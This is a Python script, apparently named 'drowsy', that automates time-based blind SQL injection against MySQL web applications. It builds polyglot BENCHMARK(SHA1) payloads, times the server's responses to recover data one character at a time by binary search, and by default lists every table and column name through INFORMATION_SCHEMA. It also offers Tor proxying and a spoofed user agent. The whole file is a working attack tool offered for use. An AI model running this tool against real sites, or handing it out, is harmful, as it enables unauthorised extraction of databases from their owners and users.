#!/usr/bin/env python3
# -*- coding:utf-8 -*-
import argparse
import requests
import logging
import math
import sys

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s.%(msecs)d | %(levelname)s | %(funcName)s | %(message)s',
    datefmt='%A, %B %d %Y %H:%M:%S',
    filename='drowsy.log',
    filemode='w'
)
logger = logging.getLogger("drowsy")
logger.info("Created the logger and started execution.")

""" Global Constants """
PADS = " "*20
ERROR_LIMIT = 10
DELAY_MAX = 99_999_999
(ROW_MIN, ROW_MAX) = (0, 999)
(CHAR_MIN, CHAR_MAX) = (1, 99)
(ASCII_MIN, ASCII_MAX) = (0, 128)
logger.info("Set global constants.")


class Defaults(object):
    """ Stores Default Runtime Arguments """
    agent = "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:31.0) Gecko/20100101 Firefox/31.0"
    table = "INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA=DATABASE()"
    ARROW = "CHAR(0x20),CHAR(0x2d),CHAR(0x2d),CHAR(0x3e),CHAR(0x20)"
    column = "CONCAT(TABLE_NAME,%s,COLUMN_NAME)" % ARROW
    timeout = 0.1
    delay = 1000


def query_arg(string: str):
    """ Evaluates Target Form & Vulnerable Form Field """
    logger.info("Evaluates target form and vulnerable form field.")
    if "^INJECT^" not in string.upper():
        logger.error("ArgumentTyperError: 'query' is missing ^INJECT^ signal.")
        raise argparse.ArgumentTypeError("'query' is missing ^INJECT^ signal")
    vuln = ""
    vuln_form = {}
    for fields in string.split("&"):
        field = fields.split("=")
        if len(field) == 2:
            vuln_form[field[0]] = field[1]
            if field[1].upper() == "^INJECT^":
                vuln = field[0]
                logger.info("Set 'vuln' to %s", vuln)
    if vuln == "":
        logger.error("ArgumentTyperError: 'query' is missing ^INJECT^ signal.")
        raise argparse.ArgumentTypeError("'query' is missing ^INJECT^ signal")
    logger.info("Set 'vuln_form' to %s", vuln_form)
    return (vuln_form, vuln)


def method_arg(string: str):
    """ Evaluates Adapter & Corresponding Request Argument """
    logger.info("Evaluates adapter and corresponding request argument.")
    if string.upper() == "GET":
        logger.info("Set 'GET' method.")
        return (requests.get, "params")
    elif string.upper() == "POST":
        logger.info("Set 'POST' method.")
        return (requests.post, "data")
    else:
        logger.error("ArgumentTypeError: 'method' must be either 'GET' or 'POST'")
        raise argparse.ArgumentTypeError("'method' must be either 'GET' or 'POST'")


def timeout_arg(string: str) -> float:
    """ Evaluates Read Timeout As A Decimal """
    logger.info("Evaluates read timeout as a decimal.")
    try:
        return float(string)
    except ValueError:
        logger.error("ArgumentTypeError: 'timeout' must be a decimal.")
        raise argparse.ArgumentTypeError("'timeout' must be a decimal")


def delay_arg(string: str) -> int:
    """ Evaluates Delay As An Integer """
    logger.info("Evaluates delay as an integer.")
    try:
        delay = int(string)
    except ValueError:
        logger.error("ArgumentTypeError: 'delay' must be an integer.")
        raise argparse.ArgumentTypeError("'delay' must be an integer")
    else:
        if delay <= 0 and delay >= DELAY_MAX:
            logger.info("ArgumentTypeError: 'delay' must be > 0 and < %s", DELAY_MAX)
            raise argparse.ArgumentTypeError(f"'delay' must be > 0 and < {DELAY_MAX}")
        else:
            return delay


def cookie_arg(string: str):
    """ Evaluates Session Cookie """
    logger.info("Evaluates session cookie.")
    cookie = {}
    string = string.replace("; ", ";")
    _string = string[:-1] if string[-1] == ";" else string
    for fields in _string.split(";"):
        field = fields.split("=")
        if len(field) == 2:
            cookie[field[0]] = field[1]
    logger.info("Set 'cookie' to %s", cookie)
    return cookie


def proxy_arg(string: str) -> dict:
    """ Evaluates Proxy Argument """
    logger.info("Evaluates proxy argument.")
    proxy = {"http": None, "https": None}
    if "https://" in string:
        proxy["https"] = string
    elif "http://" in string:
        proxy["http"] = string
    else:
        proxy["http"] = string
        proxy["https"] = string
    logger.info("Set 'proxy' to %s", proxy)
    return proxy


def get_args():
    """ Gathers & Evaluates Command Line Arguments """
    logger.info("Gathers and evaluates command line arguments.")
    defaults = Defaults()
    parser = argparse.ArgumentParser()

    """ Required Arguments """
    parser.add_argument(
        "-u", "--url", metavar="url",
        type=str, required=True,
        help="specify the target url to attack"
    )
    parser.add_argument(
        "-q", "--query", metavar="query",
        type=query_arg, required=True,
        help="specify the request query to tamper with"
    )

    """ Request Type, Read Timeout, & Output Logging """
    parser.add_argument(
        "-m", "--method", metavar="method",
        type=method_arg, default="GET", required=False,
        help="specify the request query to tamper with"
    )
    parser.add_argument(
        "-t", "--timeout", metavar="timeout",
        type=timeout_arg, default=defaults.timeout, required=False,
        help="specify the time to wait before assuming the target is asleep"
    )
    parser.add_argument(
        "-d", "--delay", metavar="delay",
        type=delay_arg, default=defaults.delay, required=False,
        help="specify a benchmark delay as a minimum for the attack"
    )
    parser.add_argument(
        "-o", "--outfile", metavar="outfile",
        type=str, required=False,
        help="specify an output file name to save results to"
    )

    """ User-Agent, Session Cookie, & Tor Proxy """
    parser.add_argument(
        "-a", "--agent", metavar="agent",
        type=str, default=defaults.agent, required=False,
        help="specify a custom user agent to include in request headers"
    )
    parser.add_argument(
        "-c", "--cookie", metavar="cookie",
        type=cookie_arg, required=False,
        help="specify a session cookie to include in request headers"
    )
    parser.add_argument(
        "-p", "--proxy", metavar="proxy",
        type=proxy_arg, required=False,
        help="specify a proxy host to use... < -p 'socks5h://localhost:9050' >"
    )
    parser.add_argument(
        "-k", "--keep-alive", dest="keep_alive", action="store_true",
        help="specify this flag to send the 'keep-alive' header instead of 'close'"
    )

    """ Target Table & Column """
    parser.add_argument(
        "-T", "--table", metavar="table",
        type=str, default=defaults.table, required=False,
        help="specify table to extract columns from"
    )
    parser.add_argument(
        "-C", "--column", metavar="column",
        type=str, default=defaults.column, required=False,
        help="specify column to select from"
    )

    """ Console Verbosity """
    parser.add_argument(
        "-v", "--verbose", dest="verbose", action="store_true",
        help="specify this flag to show the request payload for every character found"
    )
    parser.add_argument(
        "-D", "--debug", dest="debug", action="store_true",
        help="specify this flag to show the request payload for every single request"
    )

    """ Returns A Dictionary Of Arguments """
    args = dict(parser.parse_args()._get_kwargs())
    logger.info("Set 'args' to %s", args)
    return args


""" Shared Arguments """
cmd_args = get_args()
(vuln_form, vuln) = cmd_args["query"]  # request form and vulnerable parameter
(adapter, req_arg) = cmd_args["method"]  # requests -> polymorphic method object
logger.info("Set shared arguments.")

""" Mutable Payload Framework Dictionary """
header = {
    "url": cmd_args["url"],
    "headers": {
        "User-Agent": cmd_args["agent"],
        "Connection": "keep-alive" if cmd_args["keep_alive"] else "close"
    },
    "proxies": cmd_args["proxy"],
    "cookies": cmd_args["cookie"],
    "timeout": cmd_args["timeout"],
    req_arg: vuln_form
}
logger.info("Set 'header' to %s", header)

""" Payload Format Strings """
_SQL = "SELECT %s FROM %s LIMIT %d,1"                       # column, table, row
_CONDITION = "ASCII(SUBSTRING((%s),%d,1))%s%d"              # _sql, char, op, value
_QUESTION = "IF((%s),BENCHMARK(%d,SHA1(0xDEADBEEF)),NULL)"  # _condition, delay
_ADAPTIVE = "%s/*'XOR(%s)OR'|\"XOR(%s)OR\"*/"               # _question, _question, _question


def send_payload(value: int, table: str, column: str, row: int, char: int, op=None) -> bool:
    """ Builds and sends an adaptive payload to the target and evaluates the response time """
    logger.info("Builds and sends an adaptive payload to the target and evaluates the response time.")
    _op = op if op else "<="
    _sql = _SQL % (column, table, row)
    _condition = _CONDITION % (_sql, char, _op, value)
    _question = _QUESTION % (_condition, cmd_args["delay"])
    _adaptive = _ADAPTIVE % (_question, _question, _question)
    logger.debug("Set 'payload' to %s", _adaptive)
    header[req_arg][vuln] = _adaptive
    if cmd_args["debug"]:
        print(header)
    try:
        r = adapter(**header)
    except requests.exceptions.ConnectTimeout:
        # Server is overloaded with requests
        logger.error("requests.exceptions.ConnectTimeout: Request timed out trying to connect to target.")
        sys.stderr.write("[!] Request timed out trying to connect to target.\n")
        sys.stderr.flush()
        sys.exit(1)
    except requests.exceptions.ConnectionError:
        # TCP handshake failed to complete
        logger.error("requests.exceptions.ConnectionError: The target terminated the connection.")
        sys.stderr.write("[!] The target terminated the connection.\n")
        sys.stderr.flush()
        sys.exit(1)
    except requests.exceptions.ReadTimeout:
        # Server is hanging
        logger.info("[+] True: The target took too long reading the command!")
        return True
    else:
        logger.info("[-] False: The target responded immediately (%s)", r.elapsed)
        if cmd_args["debug"]:
            print(f"[*] Normal Response Time: {r.elapsed}")
        return False


def binary_search(mini: int, maxi: int, *args) -> int:
    """ Recursive binary search for evaluating response characters """
    if (maxi - mini) <= 1:
        result = send_payload(mini, *args)
        value = mini if result else maxi
        logger.info("Returning from recursion, set 'value' to %s", value)
        return value
    mid = math.ceil((mini + maxi) / 2)
    if send_payload(mid, *args):
        return binary_search(mini, mid, *args)
    else:
        return binary_search(mid, maxi, *args)


def modify_delay(delay_scale=10) -> bool:
    """ Modifies the BENCHMARK delay up to a maximum """
    logger.info("Modifying the BENCHMARK delay up to a maximum.")
    if cmd_args["delay"] < DELAY_MAX:
        _delay_scale = (delay_scale / 100) + 1
        _delay_float = cmd_args["delay"] * _delay_scale
        _delay = math.ceil(_delay_float)  # round up
        logger.info("Set 'delay' to %s", _delay)
        if cmd_args["verbose"]:
            print(f"[!] Increasing Delay: {_delay}{PADS}")
        cmd_args["delay"] = _delay
    else:
        logger.error("The delay is too high!")
        sys.stderr.write(f"[!] Delay too high.{PADS}\n")
        sys.stderr.flush()
        sys.exit(1)


def test_sanity(*args):
    """ Tests if the server can produce a true response """
    logger.info("Testing if the server can produce a true response.")
    should_be_true = send_payload(ASCII_MAX, *args)
    logger.info("Set 'should_be_true' to %s", should_be_true)
    should_be_false = send_payload(ASCII_MAX, *args, op=">")
    logger.info("Set 'should_be_false' to %s", should_be_false)
    if should_be_true and not should_be_false:
        logger.info("Test passed, returning False.")
        return False
    logger.info("Test failed, inrceasing delay by 5, and returning True.")
    modify_delay(5)
    if cmd_args["verbose"]:
        print("[!] Increasing delay: %d" % cmd_args["delay"])
    return True


def fetch_row(table: str, column: str, row: int, total: int, errors=0):
    """ Runs the attack to extract database information for a given row """
    logger.info("Runs the attack to extract database information for a given row.")
    if errors >= ERROR_LIMIT:
        logger.error("Too many errors while extracting rows!")
        sys.stderr.write(f"[!] Too many errors while extracting rows.{PADS}\n")
        sys.stderr.flush()
        sys.exit(1)
    string = ""
    for char in range(CHAR_MIN, CHAR_MAX):
        if not cmd_args["debug"]:
            _row = row + 1
            _delay = cmd_args["delay"]
            print(f"[{_row} of {total}] ({_delay}) {string}{PADS}", end="\r")
        args = (table, column, row, char)
        if test_sanity(*args):
            return fetch_row(table, column, row, total)
        if not send_payload(ASCII_MIN, *args):
            value = binary_search(ASCII_MIN, ASCII_MAX, *args)
            string += chr(value)
        else:
            break
    if not cmd_args["debug"]:
        print()
    return string


def get_row_count(table: str, errors=0) -> int:
    """ Evaluates the amount of total rows that the attack will extract """
    if errors >= ERROR_LIMIT:
        sys.stderr.write(f"[!] Too many errors while getting row count.{PADS}\n")
        sys.stderr.flush()
        sys.exit(1)
    string = ""
    row_count = None
    for char in range(CHAR_MIN, CHAR_MAX):
        args = (table, "COUNT(*)", ROW_MIN, char)
        if not cmd_args["debug"] and not cmd_args["verbose"]:
            _delay = cmd_args["delay"]
            print(f"[*] Benchmarking: {_delay}", end="\r")
        if test_sanity(*args):
            return get_row_count(table)
        if not send_payload(ASCII_MIN, *args):
            value = binary_search(ASCII_MIN, ASCII_MAX, *args)
            string += chr(value)
        else:
            if not string.isdigit():
                _errors = errors + 1
                return get_row_count(table, errors=_errors)
            else:
                row_count = int(string.strip())
                break
    if not cmd_args["debug"] and not cmd_args["verbose"]:
        print()
    return row_count


def attack():
    """ Gathers command-line arguments and runs the attack """
    results = []
    total = get_row_count(cmd_args["table"])
    if not total:
        sys.stderr.write("[!] Couldn't extract total number of rows from target.\n")
        sys.stderr.flush()
        sys.exit(1)
    for row in range(total):
        result = fetch_row(cmd_args["table"], cmd_args["column"], row, total)
        results.append(result)
    if cmd_args["outfile"]:
        with open(cmd_args["outfile"], "w") as f:
            f.write("\n".join(results) + "\n")


if __name__ == "__main__":
    """ Runner """
    attack()
